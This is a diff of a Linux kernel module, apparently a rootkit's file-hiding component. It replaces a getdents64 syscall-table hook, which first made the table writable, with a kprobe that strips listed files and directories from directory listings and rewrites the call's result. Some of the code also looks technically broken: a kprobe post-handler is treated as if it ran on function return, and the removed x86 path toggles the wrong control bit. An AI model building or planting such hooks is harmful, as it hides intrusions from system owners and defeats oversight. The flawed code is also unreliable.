@@ -1,17 +1,15 @@
 /*
  * hook_manager.c - Hook core manager
- * File hiding module - 使用 syscall table hook 方式
+ * File hiding module - 使用 kprobe hook getdents64
  */
 
 #include <linux/module.h>
+#include <linux/kprobes.h>
 #include <linux/kallsyms.h>
 #include <linux/slab.h>
 #include <linux/spinlock.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
-#include <linux/fcntl.h>
-#include <linux/unistd.h>
-#include <linux/set_memory.h>
 
 #include "hook.h"
 
@@ -25,15 +23,6 @@ static struct hidden_entry hidden_files[MAX_HIDDEN_FILES];
 static int hidden_count;
 static DEFINE_SPINLOCK(hidden_lock);
 
-/* Syscall table */
-static void **sys_call_table_ptr;
-
-#define SYSCALL_GETDENTS64_NR __NR_getdents64
-
-typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *regs);
-
-static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
-
 /* Directory entry structure */
 struct linux_dirent64 {
 	u64 d_ino;
@@ -42,6 +31,9 @@ struct linux_dirent64 {
 	unsigned char d_type;
 	char d_name[256];
 };
+
+/* Kprobe for getdents64 */
+static struct kprobe kp_getdents64;
 
 int add_hidden_file(const char *name, bool is_dir)
 {
@@ -137,10 +129,26 @@ void clear_hidden_list(void)
 	pr_info("[hidefile] hidden list cleared\n");
 }
 
-/* Hooked getdents64 */
-static asmlinkage long hook_getdents64(const struct pt_regs *regs)
+/* Kprobe pre_handler - called before getdents64 */
+static int kp_pre_handler(struct kprobe *p, struct pt_regs *regs)
 {
-	long ret;
+	struct linux_dirent64 __user *dirent;
+	unsigned int fd;
+	int count;
+
+	/* Get arguments: x0=fd, x1=dirent */
+	fd = regs->regs[0];
+	dirent = (struct linux_dirent64 __user *)regs->regs[1];
+
+	pr_info("[hidefile] *** getdents64 CALLED *** fd=%u, dirent=%px\n", fd, dirent);
+
+	return 0;
+}
+
+/* Kprobe post_handler - called after getdents64 returns */
+static void kp_post_handler(struct kprobe *p, struct pt_regs *regs,
+			   unsigned long flags)
+{
 	struct linux_dirent64 __user *dirent;
 	struct linux_dirent64 *kbuf = NULL;
 	struct linux_dirent64 *curr, *write_ptr;
@@ -150,41 +158,35 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 	int entries_total = 0;
 	int i;
 
-	/* Get arguments: x0=fd, x1=dirent */
+	/* Get return value (x0 on arm64) */
+	count = (int)regs->regs[0];
+
+	if (count <= 0)
+		return;
+
+	/* Get arguments */
 	dirent = (struct linux_dirent64 __user *)regs->regs[1];
 
-	/* Call original */
-	ret = orig_getdents64(regs);
+	pr_info("[hidefile] getdents64 returned: ret=%d, hidden_count=%d\n", count, hidden_count);
 
-	pr_info("[hidefile] *** getdents64 CALLED *** ret=%ld, dirent=%px\n", ret, dirent);
-
-	if (ret <= 0)
-		return ret;
-
-	count = (int)ret;
-
-	/* Always log when getdents64 is called */
-	pr_info("[hidefile] getdents64 hooked: ret=%d, dirent=%px, hidden_count=%d\n", 
-		(int)ret, dirent, hidden_count);
-	pr_info("[hidefile] hidden list (%d entries):\n", hidden_count);
+	/* Print hidden list */
 	for (i = 0; i < hidden_count; i++) {
 		if (hidden_files[i].active)
-			pr_info("  [%d] name=%s, is_dir=%d\n",
-				i, hidden_files[i].name, hidden_files[i].is_dir);
+			pr_info("[hidefile]   hidden[%d]: %s (%s)\n",
+				i, hidden_files[i].name,
+				hidden_files[i].is_dir ? "DIR" : "FILE");
 	}
 
 	/* Allocate kernel buffer */
 	kbuf = kmalloc(count + 256, GFP_ATOMIC);
-	if (!kbuf) {
-		pr_err("[hidefile] kmalloc failed\n");
-		return ret;
-	}
+	if (!kbuf)
+		return;
 
 	/* Copy from user space */
 	if (copy_from_user(kbuf, dirent, count)) {
 		pr_err("[hidefile] copy_from_user failed\n");
 		kfree(kbuf);
-		return ret;
+		return;
 	}
 
 	/* Filter hidden entries */
@@ -195,22 +197,20 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 	while (curr < kbuf + count) {
 		unsigned short reclen = curr->d_reclen;
 
-		if (reclen == 0) {
-			pr_warn("[hidefile] reclen=0, breaking\n");
+		if (reclen == 0)
 			break;
-		}
 
 		memset(name, 0, sizeof(name));
 		strncpy(name, curr->d_name, sizeof(name) - 1);
 		entries_total++;
 
-		pr_info("[hidefile]   [%d] entry: name=%s, d_type=%d (%s)",
-			entries_total, name, curr->d_type,
+		pr_info("[hidefile]   [%d] %s (%s)",
+			entries_total, name,
 			curr->d_type == DT_DIR ? "DIR" : "FILE");
 
 		if (is_hidden(name, curr->d_type == DT_DIR)) {
 			entries_hidden++;
-			pr_info("[hidefile]   --> HIDDEN: %s", name);
+			pr_info("[hidefile]   --> MATCHED (will hide): %s", name);
 		} else {
 			/* Keep this entry */
 			if (write_ptr != curr)
@@ -225,75 +225,50 @@ static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 	pr_info("[hidefile] === RESULT: total=%d, hidden=%d, returned=%d ===\n",
 		entries_total, entries_hidden, new_count);
 
-	/* Copy back to user space if entries were hidden */
+	/* Copy back if entries were hidden */
 	if (new_count < count) {
 		if (copy_to_user(dirent, kbuf, new_count)) {
 			pr_err("[hidefile] copy_to_user failed\n");
-			kfree(kbuf);
-			return ret;
+		} else {
+			/* Modify return value */
+			regs->regs[0] = new_count;
+			pr_info("[hidefile] return value modified: %d --> %d\n", count, new_count);
 		}
-		ret = new_count;
 	}
 
 	kfree(kbuf);
-	return ret;
 }
 
 /* External vfs hook functions */
 extern int vfs_hook_init(void);
 extern void vfs_hook_exit(void);
 
-static bool hooked;
-static unsigned long page_addr;
-static int page_order;
+static bool kprobe_registered;
 
 static int __init hook_init(void)
 {
-	unsigned long *table;
-	unsigned long addr;
 	int ret;
 
 	pr_info("[hidefile] initializing...\n");
 
-	/* Find sys_call_table */
-	table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-	if (!table) {
-		pr_err("[hidefile] sys_call_table not found\n");
-		return -ENOENT;
-	}
-	sys_call_table_ptr = (void **)table;
-	pr_info("[hidefile] sys_call_table = %px\n", sys_call_table_ptr);
+	/* Setup kprobe for getdents64 */
+#ifdef __aarch64__
+	kp_getdents64.symbol_name = "__arm64_sys_getdents64";
+#else
+	kp_getdents64.symbol_name = "do_getdents64";
+#endif
 
-	/* Save original */
-	orig_getdents64 = (typeof(orig_getdents64))sys_call_table_ptr[SYSCALL_GETDENTS64_NR];
-	if (!orig_getdents64) {
-		pr_err("[hidefile] original getdents64 not found\n");
-		return -ENOENT;
-	}
-	pr_info("[hidefile] orig_getdents64 = %px\n", orig_getdents64);
+	kp_getdents64.pre_handler = kp_pre_handler;
+	kp_getdents64.post_handler = kp_post_handler;
 
-#ifdef CONFIG_X86_64
-	/* Make writable */
-	cr4_set_bits((unsigned long *)X86_CR4_WP);
-#elif defined(CONFIG_ARM64)
-	/* Make page writable for ARM64 */
-	addr = (unsigned long)sys_call_table_ptr;
-	page_addr = addr & PAGE_MASK;
-	page_order = get_order(sizeof(void *) * SYSCALL_GETDENTS64_NR);
-	ret = set_memory_rw(page_addr, 1 << page_order);
-	if (ret) {
-		pr_err("[hidefile] set_memory_rw failed: %d\n", ret);
+	ret = register_kprobe(&kp_getdents64);
+	if (ret < 0) {
+		pr_err("[hidefile] failed to register kprobe: %d\n", ret);
 		return ret;
 	}
-#endif
 
-	/* Hook */
-	sys_call_table_ptr[SYSCALL_GETDENTS64_NR] = (void *)hook_getdents64;
-	hooked = true;
-
-#ifdef CONFIG_X86_64
-	cr4_clear_bits((unsigned long *)X86_CR4_WP);
-#endif
+	kprobe_registered = true;
+	pr_info("[hidefile] kprobe registered at %px\n", kp_getdents64.addr);
 
 	ret = vfs_hook_init();
 	if (ret < 0)
@@ -305,18 +280,9 @@ static int __init hook_init(void)
 
 static void __exit hook_exit(void)
 {
-	if (hooked) {
-#ifdef CONFIG_ARM64
-		set_memory_ro(page_addr, 1 << page_order);
-#endif
-#ifdef CONFIG_X86_64
-		cr4_set_bits((unsigned long *)X86_CR4_WP);
-#endif
-		sys_call_table_ptr[SYSCALL_GETDENTS64_NR] = (void *)orig_getdents64;
-#ifdef CONFIG_X86_64
-		cr4_clear_bits((unsigned long *)X86_CR4_WP);
-#endif
-		pr_info("[hidefile] unhooked getdents64\n");
+	if (kprobe_registered) {
+		unregister_kprobe(&kp_getdents64);
+		pr_info("[hidefile] kprobe unregistered\n");
 	}
 
 	vfs_hook_exit();
